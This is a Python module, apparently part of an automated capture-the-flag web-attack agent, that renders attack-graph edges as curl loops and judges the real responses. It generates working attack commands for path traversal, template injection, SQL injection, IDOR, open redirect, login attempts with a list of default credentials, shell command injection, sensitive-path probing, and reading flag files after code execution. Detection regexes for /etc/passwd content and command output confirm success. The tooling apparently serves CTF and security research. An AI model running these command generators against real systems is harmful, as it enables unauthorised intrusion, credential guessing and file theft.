"""把攻击图的边渲染成命令，并从真实响应里判定结果。

职责刻意拆开（garak 的 probe/detector 配对）：
- `render` 只产出命令，不关心结果；
- `judge` 只吃真实字节，不看模型自述。

这样「模型说自己成功了」永远不会被当成成功。
"""
from __future__ import annotations

import json
import re
import shlex

from .attack_graph import (
    CMD_INJECT_PAYLOADS,
    IDOR_IDS,
    LFI_PAYLOADS,
    REDIRECT_PAYLOADS,
    SQLI_PAYLOADS,
    SSTI_PAYLOADS,
    Edge,
    Entry,
)

# 会话文件固定路径：所有 curl 都带 -b/-c 同一个 jar，登录一次全局可用。
SESSION_FILE = "/tmp/.deepsick_cj"
SCRATCH = "/tmp/.deepsick_out"

# 少量常见凭据。不做字典爆破——靶场里爆破最先触发主动防御，而且容易把题打死。
COMMON_CREDS = (
    "employee:employee123",
    "employee:employee",
    "admin:admin",
    "admin:password",
    "admin:123456",
    "admin:admin123",
    "test:test",
    "user:user",
    "guest:guest",
)

# 登录成功后主动收割这些页面：表单参数名是派边的原料
HARVEST_PATHS = ("/", "/dashboard.php", "/dashboard", "/index.php", "/home",
                 "/profile.php", "/assets", "/reports", "/admin",
                 "/dash.php", "/dash", "/report.php", "/main.php", "/list.php",
                 "/api.php")

FLAG_RE = re.compile(r"flag\{[0-9a-zA-Z_\-]{6,}\}", re.I)
LFI_PROOF = re.compile(r"root:x:0:0:")
SQLI_ERROR = re.compile(
    r"SQL syntax|mysql_fetch|mysqli|ORA-\d{4}|SQLite3?::|unclosed quotation|"
    r"quoted string not properly terminated|PG::SyntaxError|syntax error at or near|"
    r"SQLSTATE|You have an error in your SQL", re.I)
SSTI_PROOF = re.compile(r"(?<![\d.])49(?![\d.])")


def _q(value: str) -> str:
    """shell 单引号转义。payload 里带引号是常态（SQL 注入），必须走这个。"""
    return shlex.quote(value)


def _curl_get(url: str, param: str, payload: str) -> str:
    # 带上 redirect_url 是必须的：未登录时服务端 302 到 login，只看状态码分不清
    # 「这个族打不通」和「压根没权限」，会把边误关掉（a-05 的 download.php 就是）。
    #
    # 参数名用单引号、值用双引号是刻意的：`'id'="$p"` 才能让 shell 把循环变量
    # 展开。之前写成 `--data-urlencode 'id=$p'`（整体单引号），$p 不展开，
    # curl 收到的是字面量 "id=$p"，LFI 整族会静默失效。
    return (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
            f"-w '%{{http_code}} %{{size_download}} %{{redirect_url}}' --get "
            f"--data-urlencode {_q(param)}=\"{payload}\" {_q(url)}")


def _curl_post(url: str, pairs: dict[str, str]) -> str:
    data = "&".join(f"{k}={v}" for k, v in pairs.items())
    return (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
            f"-w '%{{http_code}} %{{size_download}}' -d {_q(data)} {_q(url)}")


def _first_param(entry: Entry, kinds: tuple[str, ...]) -> str | None:
    for name, kind in entry.params.items():
        if kind in kinds:
            return name
    return None


def _url(base_url: str, entry: Entry) -> str:
    base = base_url.rstrip("/")
    # 前端脚本里的接口常是相对路径（api.php?action=export），要拼回绝对地址
    if getattr(entry, "relative", False):
        return f"{base}/{entry.path.lstrip('/')}"
    return base + entry.path


def _cmd_inject_pairs(entry: Entry) -> list[dict[str, str]]:
    """命令注入要带的参数组合。

    文件名一般不是唯一参数：a-09 的导出接口还要 report_id，而只有 id=2 才
    有权限（id=1 返回「无权导出」）。所以这里把 id 语义参数遍历 1/2/3，
    其它参数给一个无害默认值，一条命令把组合一次打完。
    """
    id_params = [n for n, k in entry.params.items() if k == "id"]
    others = {n: ("test.txt" if k == "file" else "a" if k == "search" else "1")
              for n, k in entry.params.items() if k != "id"}
    if not id_params:
        return [others] if others else [{}]
    combos = []
    for value in ("1", "2", "3"):
        for name in id_params:
            combo = dict(others)
            combo[name] = value
            combos.append(combo)
    return combos


def render(edge: Edge, base_url: str) -> str | None:
    """渲染成一条单行命令。返回 None 表示这条边当前没法确定性执行。"""
    entry = edge.entry

    if edge.family == "lfi" and entry:
        name = _first_param(entry, ("file",)) or "file"
        url = _url(base_url, entry)
        parts = [f"for p in {' '.join(_q(p) for p in LFI_PAYLOADS)}; do "
                 f"printf '### %s ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                 f"head -c 300 {SCRATCH}; echo; done"]
        return " ; ".join(parts)

    if edge.family == "ssti" and entry:
        name = _first_param(entry, ("search",)) or "q"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in SSTI_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"head -c 200 {SCRATCH}; echo; done")

    if edge.family == "sqli" and entry:
        name = _first_param(entry, ("search", "id")) or "q"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in SQLI_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"grep -aiE 'SQL syntax|SQLSTATE|syntax error|quotation' {SCRATCH} | head -2; done")

    if edge.family == "idor" and entry:
        name = _first_param(entry, ("id",)) or "id"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(IDOR_IDS)}; do "
                f"printf '### id=%s => ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                f"head -c 160 {SCRATCH}; echo; done")

    if edge.family == "open_redirect" and entry:
        name = _first_param(entry, ("redirect",)) or "next"
        url = _url(base_url, entry)
        return (f"for p in {' '.join(_q(p) for p in REDIRECT_PAYLOADS)}; do "
                f"printf '### %s => ' \"$p\"; "
                f"curl -sS -b {SESSION_FILE} -o /dev/null -w '%{{http_code}} %{{redirect_url}}' "
                f"--get --data-urlencode {_q(name + '=')}"
                f"\"$p\" {_q(url)}; echo; done")

    if edge.family == "auth" and entry:
        url = _url(base_url, entry)
        user_param = "username"
        pass_param = "password"
        for name in entry.params:
            if name.lower() in ("user", "username", "email", "account", "uname"):
                user_param = name
            if name.lower() in ("pass", "password", "pwd", "passwd"):
                pass_param = name
        creds = list(COMMON_CREDS)
        # 图从前端代码里翻出来的凭据优先加进来：模型为此把 JS 读了五遍都没用上，
        # 而代码一次就能解出来。
        try:
            extra = json.loads(edge.payload_note or "[]")
        except Exception:
            extra = []
        for item in extra:
            if item and item not in creds:
                creds.append(item)
        creds_text = " ".join(_q(c) for c in creds)
        # 登录成功后必须顺手把受保护页面里的入口抓出来——否则图是空的，
        # 下一步又只能靠模型瞎猜。这一步合进同一条命令，不额外花步数。
        harvest = (" ; for u in / /dashboard.php /dashboard /index.php /home /profile.php; do "
                   f"printf '=== %s ' \"$u\"; "
                   f"curl -sS -b {SESSION_FILE} -o /tmp/.deepsick_page "
                   f"-w '%{{http_code}} %{{size_download}}' "
                   "\"$BASE$u\"; echo; "
                   "grep -oE 'href=\"[^\"]+\"|action=\"[^\"]+\"' /tmp/.deepsick_page "
                   "| grep -vE 'https?://|#|\\.css|\\.js' | head -30; done")
        return (f"BASE={_q(base_url.rstrip('/'))} ; for c in {creds_text}; do "
                f"u=\"${{c%%:*}}\"; pw=\"${{c##*:}}\"; "
                f"rm -f {SESSION_FILE}; "
                f"r=$(curl -sS -c {SESSION_FILE} -o /dev/null "
                f"-w '%{{http_code}} %{{redirect_url}}' "
                f"-d {_q(user_param + '=')}\"$u\" -d {_q(pass_param + '=')}\"$pw\" "
                f"{_q(url)}); printf '%s => %s\\n' \"$c\" \"$r\"; "
                f"case \"$r\" in 30*) case \"$r\" in *login*) ;; *) "
                f"echo LOGIN_OK \"$c\"; break;; esac;; esac; "
                f"done" + harvest)

    if edge.family == "cmd_inject" and entry:
        name = _first_param(entry, ("file",)) or "filename"
        url = _url(base_url, entry)
        payloads = " ".join(_q(p) for p in CMD_INJECT_PAYLOADS)
        calls = []
        for combo in _cmd_inject_pairs(entry):
            data = "&".join(f"{k}={v}" for k, v in combo.items())
            if entry.method.upper() == "POST":
                call = (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
                        f"-w '%{{http_code}}' -d {_q(data)} "
                        f"--data-urlencode {_q(name + '=')}\"$p\" {_q(url)}")
            else:
                call = (f"curl -sS -b {SESSION_FILE} -c {SESSION_FILE} -o {SCRATCH} "
                        f"-w '%{{http_code}}' --get --data {_q(data)} "
                        f"--data-urlencode {_q(name + '=')}\"$p\" {_q(url)}")
            calls.append(f"printf '### %s %s\\n' \"$p\" {_q(data)}; {call}; echo; "
                         f"grep -aoE 'flag\\{{[^}}]+\\}}' {SCRATCH}")
        return f"for p in {payloads}; do " + " ; ".join(calls) + " ; done"

    if edge.family == "harvest":
        # 把业务页面里的表单与链接原样抓出来，同时保留正文开头——API 返回的
        # JSON 配置表就藏在正文里（a-17 的 hint 提到「系统配置表」）。
        # 目标优先用图里已知的全部路径，再加常见页面兜底；相对路径要补斜杠。
        extra = [p for p in (edge.payload_note or "").split() if p]
        paths = list(dict.fromkeys(list(HARVEST_PATHS) + extra))
        norm = [(p if p.startswith("/") else "/" + p) for p in paths]
        arr = " ".join(_q(p) for p in norm)
        return (f"BASE={_q(base_url.rstrip('/'))} ; for u in {arr}; do "
                f"printf '=== %s\\n' \"$u\"; "
                f"curl -sS -b {SESSION_FILE} -m 8 \"$BASE$u\" "
                f"| tee {SCRATCH} | head -c 1200; echo; "
                f"grep -oE '<form[^>]*>|</form>|<input[^>]*>|href=\"[^\"]+\"' "
                f"{SCRATCH} | head -30; done")

    if edge.family == "recon":
        # 一次打完一整批敏感路径；命中的路径把正文一并打出来，图据此长出新入口。
        # 这是图的自愈动作：具体边全打空后回到侦察，而不是停在原地。
        from . import sense
        arr = " ".join(_q(p) for p in sense.PROBE_PATHS)
        return (f"BASE={_q(base_url.rstrip('/'))} ; "
                f"for p in {arr}; do "
                f"c=$(curl -sS -b {SESSION_FILE} -o {SCRATCH} -w '%{{http_code}}' "
                f"\"$BASE$p\"); printf '%s %s\\n' \"$p\" \"$c\"; "
                f"case \"$c\" in 404|'') ;; *) head -c 3000 {SCRATCH}; echo;; esac; "
                f"done")

    if edge.family == "flag_hunt":
        # 已经有 file_read：用它自己的入口读 flag 位置，这是最短路径
        if edge.entry is not None and edge.entry.params:
            name = _first_param(edge.entry, ("file",)) or "file"
            url = _url(base_url, edge.entry)
            return (f"for p in {' '.join(_q(p) for p in LFI_PAYLOADS)}; do "
                    f"printf '### %s ' \"$p\"; {_curl_get(url, name, '$p')}; echo; "
                    f"grep -aoE 'flag\\{{[^}}]+\\}}' {SCRATCH} | head -2; done")
        # 有 rce：一条命令把常见 flag 位置读完
        return ("cat /challenge/flag.txt /flag /flag.txt /root/flag.txt "
                "/flag_is_here /home/*/flag* 2>/dev/null; "
                "ls -la /challenge 2>/dev/null; "
                "find / -maxdepth 3 -iname '*flag*' 2>/dev/null | head")

    return None


def judge(edge: Edge, output: str) -> dict:
    """从真实输出判定这条边的结果。

    返回 {state, flags, caps, note}：
      state: worked / failed / inconclusive / auth_required
      caps:  应该新加到图上的能力 [(kind, via, detail)]

    能力先算、flag 后判：快打直接命中 flag 时也不能丢能力记账，否则
    「拿到 file_read → 派 flag_hunt」这条链会在 flag 命中的路径上断掉
    （旧实现 caps 永远空，就是这个原因）。
    """
    body = output or ""
    flags = FLAG_RE.findall(body)
    caps: list[tuple[str, str, str]] = []
    fam = edge.family
    via = edge.entry.key if edge.entry else "global"
    proof_worked = False

    if fam == "lfi" and LFI_PROOF.search(body):
        proof_worked = True
        caps.append(("file_read", via,
                     f"{edge.entry.path if edge.entry else ''} 可读任意文件"))
    elif fam == "cmd_inject" and re.search(
            r"uid=\d+\([\w.-]+\)|www-data|root:x:0:0:", body):
        proof_worked = True
        caps.append(("rce", via, "参数可注入 shell 命令"))
    elif fam == "sqli" and SQLI_ERROR.search(body):
        proof_worked = True
        caps.append(("db_error", via, "SQL 报错泄露"))
    elif fam == "auth" and "LOGIN_OK" in body:
        proof_worked = True
        caps.append(("auth", "session", body.split("LOGIN_OK", 1)[1].strip()[:60]))
    elif fam == "ssti" and SSTI_PROOF.search(body):
        proof_worked = True
    elif fam == "open_redirect" and re.search(r"30[127]\s+http://example\.com",
                                              body):
        proof_worked = True

    # flag 命中本身就是这族可达的证明：补上族对应的能力，不让链断
    if flags and fam == "lfi" and not caps:
        caps.append(("file_read", via,
                     f"{edge.entry.path if edge.entry else ''} 可读任意文件"))
    elif flags and fam == "cmd_inject" and not caps:
        caps.append(("rce", via, "参数可注入 shell 命令"))

    if flags:
        return {"state": "worked", "flags": flags, "caps": caps,
                "note": f"命中 Flag {flags[0]}"}

    # 整族都被 302 到登录页：这不是「这个漏洞族不存在」，而是「还没权限」。
    # 两者必须分开，否则登录成功后的重开机制就失效了——a-05 的 download.php
    # 在未登录时正是 302，如果判成 failed，拿到会话后这条边也不会再被派发。
    if fam != "auth" and re.search(r"30[127]\s+\S*login", body, re.I):
        return {"state": "auth_required", "flags": flags, "caps": caps,
                "note": "需要登录才能打；登录成功后这条边会重新派发"}

    if proof_worked:
        note = {
            "lfi": "确认任意文件读取（读到 /etc/passwd）",
            "ssti": "模板表达式被求值（7*7=49）",
            "sqli": "确认 SQL 注入（有报错）",
            "auth": "登录成功，会话已写入 " + SESSION_FILE,
            "cmd_inject": "确认命令注入（命令执行结果回显）",
            "open_redirect": "跳转参数未校验",
        }.get(fam, "")
        return {"state": "worked", "flags": flags, "caps": caps, "note": note}

    failed_note = {
        "lfi": "路径穿越无回显",
        "ssti": "未见求值结果",
        "sqli": "无报错特征",
        "auth": "常见凭据均未登录成功",
        "cmd_inject": "未见命令执行回显",
        "open_redirect": "未见外部跳转",
    }
    if fam == "flag_hunt":
        return {"state": "failed" if body.strip() else "inconclusive",
                "flags": flags, "caps": caps, "note": "未读到 flag"}
    return {"state": "failed", "flags": flags, "caps": caps,
            "note": failed_note.get(fam, "")}
